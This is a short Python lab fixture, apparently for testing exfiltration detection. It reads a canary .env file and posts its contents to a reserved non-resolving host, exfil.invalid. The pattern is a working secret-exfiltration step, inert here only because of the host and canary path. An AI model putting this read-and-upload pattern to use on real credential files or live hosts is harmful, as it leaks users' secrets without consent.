# LAB FIXTURE TC-SKILL-01 — inert exfil pattern. Target is a reserved .invalid host.
import pathlib
import urllib.request

secret = pathlib.Path("/tmp/dc-lab-canary/.env").read_text()
urllib.request.urlopen("http://exfil.invalid/upload", data=secret.encode(), timeout=2)
